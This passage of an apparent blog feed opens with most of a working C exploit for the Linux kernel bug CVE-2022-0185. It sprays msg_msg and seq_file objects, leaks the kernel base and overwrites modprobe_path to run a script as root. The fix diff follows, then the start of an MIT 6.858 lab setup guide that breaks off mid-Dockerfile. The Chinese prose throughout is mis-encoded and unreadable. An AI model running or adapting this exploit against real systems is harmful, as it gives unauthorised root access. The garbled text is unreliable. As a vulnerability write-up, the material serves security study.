oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span class="hljs-string">&quot;/tmp/evil.sh&quot;</span>, O_RDWR | O_CREAT);<br>    write(shell_fd, cat_flag, <span class="hljs-keyword">sizeof</span>(cat_flag));<br>    close(shell_fd);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/evil.sh&quot;</span>);<br><br>    <span class="hljs-comment">/* exploit */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> flag_fd;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] trying arbitrary write for no.%d time...\n&quot;</span>, i);<br><br>        arbitraryWriteByMsg();<br>        system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>        flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>        <span class="hljs-keyword">if</span> (flag_fd &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Successfully overwrite the modprobe_path!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1>0x03.æ¼æ´ä¿®å¤</h1><p>è¯¥æ¼æ´åœ¨å†…æ ¸ä¸»çº¿çš„ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310e8aa03fcbdb41fc92c521756">è¿™ä¸ª commit</a> å½“ä¸­è¢«ä¿®å¤ï¼Œä¸»è¦å°±æ˜¯å°†å‡æ³•æ¢æˆäº†åŠ æ³•ï¼Œé¿å…äº†æ— ç¬¦å·æ•´å‹ä¸‹æº¢çš„é—®é¢˜ï¼Œç¬”è€…è®¤ä¸ºè¿™ä¸ªä¿®å¤è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/fs/fs_context.c b/fs/fs_context.c</span><br><span class="hljs-comment">index b7e43a780a625..24ce12f0db32e 100644</span><br><span class="hljs-comment">--- a/fs/fs_context.c</span><br><span class="hljs-comment">+++ b/fs/fs_context.c</span><br><span class="hljs-meta">@@ -548,7 +548,7 @@</span> static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>       param-&gt;key);<br> &#125;<br> <br><span class="hljs-deletion">-if (len &gt; PAGE_SIZE - 2 - size)</span><br><span class="hljs-addition">+if (size + len + 2 &gt; PAGE_SIZE)</span><br> return invalf(fc, &quot;VFS: Legacy: Cumulative options too large&quot;);<br> if (strchr(param-&gt;key, &#x27;,&#x27;) ||<br>     (param-&gt;type == fs_value_is_string &amp;&amp;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;è¿˜æ˜¯ mount å¥½&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</title>
    <link href="http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/"/>
    <id>http://blog.arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/</id>
    <published>2022-12-24T18:15:28.000Z</published>
    <updated>2022-12-24T18:15:37.843Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¦‚ä¹°ä¸ª CTF è¯¾</p><span id="more"></span><h1>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="http://css.csail.mit.edu/6.858/2022/">MIT 6.858</a> æ˜¯é¢å‘é«˜å¹´çº§æœ¬ç§‘ç”Ÿä¸ç ”ç©¶ç”Ÿå¼€è®¾çš„ä¸€é—¨å…³äº<strong>è®¡ç®—æœºç³»ç»Ÿå®‰å…¨</strong>ï¼ˆsecure computer securityï¼‰çš„è¯¾ç¨‹ï¼Œå†…å®¹åŒ…æ‹¬å¨èƒæ¨¡å‹ï¼ˆthreat modelsï¼‰ã€å±å®³å®‰å…¨çš„æ”»å‡»ï¼ˆattacks that compromise securityï¼‰ã€å®ç°å®‰å…¨çš„æŠ€æœ¯ï¼ˆtechniques for achieving securityï¼‰</p><p>åœ¨ YouTube ä¸Šæœ‰<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">å¾€å¹´çš„è¯¾ç¨‹å›æ”¾</a>ï¼Œé…æœ‰è‹±æ–‡å­—å¹•ï¼Œä¸è¿‡ä½œä¸ºä¸€ä¸ªå¹¶éæ˜¯å¯¹å®‰å…¨ä¸€æ— æ‰€çŸ¥çš„å®‰å…¨å°ç™½ï¼Œç¬”è€…ä¸»è¦è¿˜æ˜¯æŒ‘è‡ªå·±ä¸ç†Ÿæ‚‰çš„é‚£ä¸€å—è·³ç€å¬ï¼ˆç¬‘ï¼‰</p><p>è¿™ä¸ªè¯¾ç¨‹ä¸€å…±æœ‰äº”ä¸ª Labï¼š</p><ul><li>Lab1ï¼šç¼“å†²åŒºæº¢å‡ºï¼ˆbuffer overflowï¼‰</li><li>Lab2ï¼šæƒé™åˆ†ç¦»ä¸æœåŠ¡ä¾§æ²™ç®±ï¼ˆprivilege separation and server-side sandboxingï¼‰</li><li>Lab3ï¼šç¬¦å·æ‰§è¡Œï¼ˆsymbolic executionï¼‰</li><li>Lab4ï¼šæµè§ˆå™¨å®‰å…¨ï¼ˆbrowser securityï¼‰</li><li>Lab5ï¼šå®‰å…¨çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆsecure file systemï¼‰</li></ul><p>å‰å››ä¸ª Lab ä¸»è¦æ˜¯åŸºäº MIT å¼€å‘çš„ä¸€ä¸ªå« <code>zookws</code> çš„ web server å®Œæˆçš„</p><h2 id="PRE-ç¯å¢ƒæ­å»º-è¯´æ˜">PRE. ç¯å¢ƒæ­å»º &amp;&amp; è¯´æ˜</h2><p>è¿™é‡Œç»™å‡ºä¸‰ç§æ­å»ºå®éªŒç¯å¢ƒçš„æ–¹å¼</p><h3 id="Method-I-ï¼ˆæ¨èï¼‰ä½¿ç”¨-MIT-æä¾›çš„-VM-é•œåƒ">Method I.ï¼ˆæ¨èï¼‰ä½¿ç”¨ MIT æä¾›çš„ VM é•œåƒ</h3><blockquote><p>å‚è§ <a href="http://css.csail.mit.edu/6.858/2022/labs/lab1.html">Lab 1</a></p></blockquote><p>MIT æä¾›äº†ä¸€ä¸ª  <a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">course VM image</a> ï¼Œå…¶ä¸­æœ‰ç€ä¸€ä¸ª Ubuntu 21.10 çš„ç³»ç»Ÿï¼Œç™»å½•çš„ç”¨æˆ·åä¸º <code>student</code>ï¼Œå¯†ç ä¸º <code>6858</code>ï¼Œä¸‹è½½è§£å‹åæ ¹æ®è‡ªèº«çš„æœ¬åœ°ç¯å¢ƒè¿›è¡Œå¯¹åº”çš„æ“ä½œï¼š</p><ul><li>ä½¿ç”¨ KVM è¿è¡Œï¼šç›´æ¥è¿è¡Œ <strong><code>./6.858-x86_64-v22.sh</code></strong> å³å¯</li><li>ä½¿ç”¨ VMwareè¿è¡Œï¼šæ–°å»ºè™šæ‹Ÿæœºâ†’ç¨åå®‰è£…æ“ä½œç³»ç»Ÿâ†’é€‰æ‹©ç³»ç»Ÿ <code>Linux &gt; Debian 9.x 64-bit</code> â†’ç§»é™¤åŸæœ‰è™šæ‹Ÿç£ç›˜â†’æ·»åŠ æ–°çš„è™šæ‹Ÿç£ç›˜â†’é€‰æ‹©  <code>6.858-x86_64-v22.vmdk</code> å³å¯</li></ul><p>å¯¹äºé X86 æ¶æ„çš„å¤„ç†å™¨ç¯å¢ƒï¼Œ<s>ğŸ‘´çš„å»ºè®®æ˜¯åˆ«åšäº†</s>ï¼Œåœ¨å®éªŒæ‰‹å†Œé‡Œæ¨èå®‰è£… qemu ï¼Œç¬”è€…å°±ä¸æ‘˜æŠ„ä¸€éäº†</p><p><img src="https://s2.loli.net/2022/12/07/bjhUwo5k9q8EiTJ.png" alt="image.png"></p><p>å½“ç„¶æ²¡æœ‰å›¾å½¢ç•Œé¢åªæœ‰ä¸€ä¸ª tty æ¯”è¾ƒéš¾å—ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯æ¨èç”¨ ssh è¿ä¸Šå»åšï¼Œå› ä¸ºè™šæ‹Ÿæœºåœ¨æœ¬åœ°æ‰€ä»¥ç›´æ¥ <code>ip addr show dev eth0</code> æ‰¾åˆ° IP å <code>ssh student@YOUR_IP</code> å°±è¡Œï¼š</p><p><img src="https://s2.loli.net/2022/12/07/MJcV1zZdS5NvnjE.png" alt="image.png"></p><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>zookd</code> è´Ÿè´£æ¥æ”¶ HTTP è¯·æ±‚ï¼Œå…¶ç”± C ç¼–å†™ï¼ŒHTTP ç›¸å…³çš„ä»£ç ä½äº <code>http.c</code> ä¸­ï¼ŒHTTP åè®®ç›¸å…³èµ„æ–™<a href="https://www.garshol.priv.no/download/text/http-tut.html">è§æ­¤å¤„</a></p><p>zookd æœ‰ä¸¤ç§ç‰ˆæœ¬ï¼š</p><ul><li><code>zookd-exstack</code>ï¼šæ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™</li><li><code>zookd-nxstack</code>ï¼šæ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™</li></ul><p>ç”¨ä»¥è¿›è¡Œè¯„åˆ†çš„ <code>zookd</code> ä½äº <code>bin.tar.gz</code> ä¸­</p><p>æ­¤å¤–ï¼ŒMIT è¿˜æä¾›äº†ä¸€ä¸ªç”¨ä»¥æ¸…ç†ç¯å¢ƒçš„ <code>clean-env.sh</code> è„šæœ¬ï¼Œç”¨ä»¥ç¡®ä¿æ¯æ¬¡çš„æ‰§è¡Œç¯å¢ƒéƒ½æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿è¡Œ zookdï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd 8080</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½åœ¨æœ¬åœ°çš„ 8080 ç«¯å£è®¿é—®åˆ° zookdï¼Œç›´æ¥è¿›å»å¤§æ¦‚ä¼šæ˜¯è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/KUG3v2uoqjm9nZg.png" alt="image.png"></p><h3 id="Method-II-è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ">Method II. è‡ªè¡Œé…ç½®æœ¬åœ°å®éªŒç¯å¢ƒ</h3><p>é¦–å…ˆæ˜¯é…ç¯å¢ƒï¼Œé™¤äº† <code>pwntools</code> æ˜¯ç¬”è€…ä¸ªäººæ¯”è¾ƒå–œæ¬¢çš„ä¸€ä¸ªç¼–å†™ exp çš„æ¨¡å—ä»¥å¤–å…¶ä»–éƒ½æ˜¯å®éªŒç¯å¢ƒå¿…é¡»çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo atp-get install -y curl strace lxc-dev</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br></code></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯æŒ‰æƒ¯ä¾‹æŠŠä»£ç æ‹‰åˆ°æœ¬åœ°ï¼Œå¹¶ä½¿ç”¨ <code>make</code> æ„å»ºä¸€ä¸‹ <code>zookws</code> çœ‹æœ‰æ²¡æœ‰å•¥é—®é¢˜ï¼Œæ²¡æŠ¥é”™å°±ğŸ†—ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> lab</span><br><span class="hljs-meta prompt_">lab$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h3 id="Method-III-ä½¿ç”¨-docker-æ­å»ºå®éªŒç¯å¢ƒ">Method III.ä½¿ç”¨ docker æ­å»ºå®éªŒç¯å¢ƒ</h3><p>å› ä¸ºè¯„æµ‹ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦ç”¨è¾ƒé«˜ç‰ˆæœ¬çš„ libcï¼ˆä¾‹å¦‚ç¬”è€…ç”¨çš„å°±æ˜¯ Ubuntu 20.04 with è¿‡æ—¶çš„ libc2.31ï¼‰ï¼ŒåŒæ—¶ä¹Ÿé¿å…æ±¡æŸ“æœ¬åœ°ç¯å¢ƒï¼Œå› æ­¤ä½¿ç”¨ Docker æ¥å®Œæˆå®éªŒä¹Ÿæ˜¯ä¸€ä¸ªéœ€æ±‚é¡¹</p><blockquote><p>Dockerfileï¼Œæ³¨æ„æ›¿æ¢ä¸Šè‡ªå·±çš„å…¬é’¥ï¼Œå¦‚æœæ²¡æœ‰ä»å¤–éƒ¨è¿æ¥å®¹å™¨çš„éœ€æ±‚çš„è¯è¿™ä¸€æ­¥å¯ä»¥è·³è¿‡</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-comment"># basic environment</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="language-bash">    DEBIAN_FRONTEND=noninteractive \</span><br><span class="language-bash">    apt-get install -y git python3-pip tmux vim curl openssh-server strace gdb lxc lxc-dev</span><br><br><span class="hljs-comment"># sqlalchemy for lab, pwntools for my own</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> pip3 install sqlalchemy pwntools flask z3-solver angr bytecode lxc</span><br><br><span class="hljs-comment"># pwndbg for a better debug experience</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /root &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> /root/pwndbg &amp;&amp; \</span><br><span class="language-bash">    ./setup.sh</span><br><br><span class="hljs-comment"># I&#x27;d like to make a new user for it</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> useradd -m student</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> usermod -s /bin/bash student</span><br><br><span class="hljs-comment"># clone the lab</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">cd</span> /home/student &amp;&amp; \</span><br><span class="language-bash">    git <span class="hljs-built_in">clone</span> https://web.mit.edu/6858/2022/lab.git &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> -R student:student ./lab</span><br><br><span class="hljs-comment"># make your ssh key authorized</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /home/student/.ssh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;è¿™é‡Œå†™ä½ çš„sshå…¬é’¥&quot;</span> &gt; /home/student/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># start ssh service and keep container running continuously</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span 